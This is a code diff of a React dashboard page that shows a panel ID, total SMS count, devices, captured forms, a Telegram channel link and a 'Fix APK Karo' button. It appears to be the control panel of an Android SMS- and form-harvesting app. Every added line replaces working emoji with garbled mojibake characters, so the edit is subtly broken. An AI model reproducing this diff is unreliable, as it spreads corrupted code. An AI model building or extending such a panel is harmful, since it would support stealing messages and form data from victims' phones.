-                { icon: "📱", label: "Devices", value: String(devices.length) },
-                { icon: "📋", label: "Forms", value: String(forms.length) },
-                { icon: "⭐", label: "Favorites", value: String(Object.values(favoritesMap).filter(Boolean).length) },
+                { icon: "ðŸ†”", label: "Panel ID", value: str(ENV.PANEL_ID || "-"), full: true },
+                { icon: "ðŸ·ï¸", label: "Version", value: str(ENV.VERSION || "v1.0") },
+                { icon: "ðŸ’¬", label: "Total SMS", value: String(totalSmsCount) },
+                { icon: "ðŸ“±", label: "Devices", value: String(devices.length) },
+                { icon: "ðŸ“‹", label: "Forms", value: String(forms.length) },
+                { icon: "â­", label: "Favorites", value: String(Object.values(favoritesMap).filter(Boolean).length) },
               ].map((item) => (
                 item.full ? (
                   <div key={item.label} className="col-span-2 rounded-2xl border border-white/10 px-4 py-3"
@@ -1587,7 +1589,7 @@ export default function MainPage() {
             {str(ENV.TELEGRAM_CHANNEL || "") && (
               <div className="rounded-2xl border border-white/10 px-4 py-3"
                 style={{ background: "rgba(255,255,255,0.06)" }}>
-                <div className="text-[10px] text-white/30 uppercase tracking-wide mb-1">📡 Telegram Channel</div>
+                <div className="text-[10px] text-white/30 uppercase tracking-wide mb-1">ðŸ“¡ Telegram Channel</div>
                 <div className="text-[13px] font-semibold text-blue-300 truncate">{str(ENV.TELEGRAM_CHANNEL || "")}</div>
               </div>
             )}
@@ -1595,18 +1597,18 @@ export default function MainPage() {
             {/* Buttons */}
             <button type="button" onClick={openTelegramHelp}
               className="w-full rounded-2xl border-2 border-blue-500/50 bg-blue-500/10 py-3.5 text-[14px] font-bold text-blue-400 active:scale-[0.98] transition-transform">
-              📢 Join Telegram Channel
+              ðŸ“¢ Join Telegram Channel
             </button>
             <button type="button" onClick={openFixApk}
               className="w-full rounded-2xl py-3.5 text-[14px] font-black text-black active:scale-[0.98] transition-transform"
               style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
-              🔧 Fix APK Karo
+              ðŸ”§ Fix APK Karo
             </button>
           </div>
         </div>
       )}
 
-      <button type="button" onClick={loadAll} className="fixed bottom-6 right-4 z-40 flex h-12 w-12 items-center justify-center rounded-full bg-black text-white shadow-lg text-[20px] hover:bg-gray-800" title="Refresh">↻</button>
+      <button type="button" onClick={loadAll} className="fixed bottom-6 right-4 z-40 flex h-12 w-12 items-center justify-center rounded-full bg-black text-white shadow-lg text-[20px] hover:bg-gray-800" title="Refresh">â†»</button>
       {checkAlert && <CheckAlert status={checkAlert.status} onClose={closeCheckAlert} />}
     </div>
   );
